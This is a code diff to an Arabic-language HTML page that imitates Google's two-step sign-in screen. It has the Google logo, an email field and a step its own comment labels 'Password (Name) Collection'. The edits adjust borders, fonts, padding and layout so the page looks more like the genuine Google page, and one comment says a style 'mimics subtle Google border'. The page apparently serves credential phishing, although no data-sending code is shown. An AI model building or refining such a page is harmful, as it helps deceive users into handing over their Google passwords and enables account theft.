@@ -31,7 +31,6 @@
       background: #121212;
       border-radius: 12px;
       box-shadow: none;
-      border: 1px solid #2c2c2c; /* mimics subtle Google border */
     }
 
     /* Google Logo */
@@ -42,15 +41,15 @@
 
     /* Title */
     h1 {
-      font-size: 26px;
-      font-weight: 400;
-      margin: 0 0 12px;
+      font-size: 34px;
+      font-weight: 200;
+      margin: 0 0 0 0;
       color: #fff;
     }
 
     /* Subtitle */
     .subtitle {
-      font-size: 14px;
+      font-size: 16px;
       color: #e8eaed;
       margin-bottom: 24px;
       line-height: 1.6;
@@ -63,18 +62,18 @@
 
     .input-group input {
       width: 100%;
-      padding: 14px 16px;
-      border: 1px solid #5f6368;
+      border: 0.5px solid #c0c3c7;
       border-radius: 6px;
       font-size: 16px;
-      background-color: #202124;
       color: #e8eaed;
       outline: none;
       box-sizing: border-box;
+      background-color: transparent;
+      padding:20px;
     }
 
     .input-group input::placeholder {
-      color: #9aa0a6;
+      color: #c1c5c9;
     }
 
     .input-group input:focus {
@@ -152,9 +151,9 @@
     }
     /* Additional Styles for Step 2 */
     .email-pill {
-      display: flex;
+      display: inline-flex;
       align-items: center;
-      background-color: #202124;
+      background-color: transparent;
       border: 1px solid #5f6368;
       border-radius: 24px;
       padding: 8px 12px;
@@ -163,10 +162,20 @@
       color: #e8eaed;
       max-width: 100%;
       box-sizing: border-box;
+      width: auto;
+      min-width: 0;
     }
     .email-pill svg {
       margin: 0 8px;
       flex-shrink: 0;
+    }
+    #email-display-text {
+      white-space: nowrap;
+      overflow: hidden;
+      text-overflow: ellipsis;
+      max-width: 220px;
+      display: inline-block;
+      vertical-align: middle;
     }
 
   </style>
@@ -174,34 +183,32 @@
 <body>
 
   <!-- Step 1: Email Entry -->
-  <div class="container" id="step1">
+  <div class="container " id="step1" style="padding: 24px;">
     <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 40 48" aria-hidden="true " style="logo">
       <path fill="#4285F4" d="M39.2 24.45c0-1.55-.16-3.04-.43-4.45H20v8h10.73c-.45 2.53-1.86 4.68-4 6.11v5.05h6.5c3.78-3.48 5.97-8.62 5.97-14.71z"></path>
       <path fill="#34A853" d="M20 44c5.4 0 9.92-1.79 13.24-4.84l-6.5-5.05C24.95 35.3 22.67 36 20 36c-5.19 0-9.59-3.51-11.15-8.23h-6.7v5.2C5.43 39.51 12.18 44 20 44z"></path>
       <path fill="#FABB05" d="M8.85 27.77c-.4-1.19-.62-2.46-.62-3.77s.22-2.58.62-3.77v-5.2h-6.7C.78 17.73 0 20.77 0 24s.78 6.27 2.14 8.97l6.71-5.2z"></path>
       <path fill="#E94235" d="M20 12c2.93 0 5.55 1.01 7.62 2.98l5.76-5.76C29.92 5.98 25.39 4 20 4 12.18 4 5.43 8.49 2.14 15.03l6.7 5.2C10.41 15.51 14.81 12 20 12z"></path>
     </svg>
-
-    <h1>تسجيل دخول</h1>
-    <br>
-    <p class="subtitle">باستخدام حسابك على Google</p>
+    <div style="text-align: right; margin-bottom: 28px;">
+      
+      <h1>تسجيل الدخول</h1>
+      <p class="subtitle">باستخدام حسابك على Google</p>
+    </div>
 
     <div class="input-group">
-      <input type="email" id="email-input" placeholder=" البريد الإلكتروني أو رقم الهاتف" required autocomplete="email" style="background-color: transparent;">
-    </div>
-    
-    <div style="text-align: right; margin: 16px 0;">
-      <a href="#" class="link">نسيت االبريد الإلكتروني؟</a>
-    </div>
-    
-    <div style="display: flex; justify-content: space-between; align-items: center; flex-direction: row-reverse;">
-      <button id="next-btn" class="button" style="width: auto; min-width: 100px; margin: 0; border-radius:24px;">التالي</button>
-      <a href="#" class="link" style="margin-left: 8px;">إنشاء حساب</a>
+      <input type="email" id="email-input" placeholder=" البريد الإلكتروني أو رقم الهاتف" required autocomplete="email" style="background-color: transparent; padding:18px;">
+      <a href="#" class="link" style="margin-top:6px;">نسيت االبريد الإلكتروني؟</a>
     </div>
     <p style="margin: 24px 0; color: #bdc1c6; font-size: 14px; text-align: right;">
-      ألا تمتلك هذا الكمبيوتر؟ استخدِم وضع الضيف لتسجيل الدخول بشكلٍ خاص.<br>
+      ألا تمتلك هذا الكمبيوتر؟ استخدِم وضع الضيف لتسجيل الدخول بشكلٍ خاص.
       <a href="https://support.google.com/chrome/answer/6130773?hl=ar" class="link">مزيد من المعلومات حول استخدام "وضع الضيف"</a>
     </p>
+    
+    <div style="display: flex; justify-content: space-between; align-items: center; flex-direction: row-reverse;">
+      <button id="next-btn" class="button" style="width: auto; min-width: 70px; margin: 0; border-radius:24px; padding:12px">التالي</button>
+      <a href="#" class="link" style="margin-left: 8px;">إنشاء حساب</a>
+    </div>
   </div>
 
   <!-- Step 2: Password (Name) Collection -->
@@ -234,12 +241,12 @@
       <label for="show-password">عرض كلمة المرور</label>
     </div>
 
-    <div style="display: flex; justify-content: flex-end;">
-      <button id="submit-btn" class="button">التالي</button>
+    <div style="display: flex; justify-content: space-between; align-items: center; flex-direction: row-reverse;">
+      <button id="submit-btn" class="button" style="width: auto; min-width: 70px; margin: 0; border-radius:24px; padding:12px">التالي</button>
+      <a href="#" class="link" style="margin: 24px;">جرب طريقة اخري</a>
     </div>
 
-    <div style="text-align: center; margin: 16px 0;">
-      <a href="#" class="link">جرب طريقة اخري</a>
+    <div style="text-align: center; margin: 24px 0;">
     </div>
   </div>
 
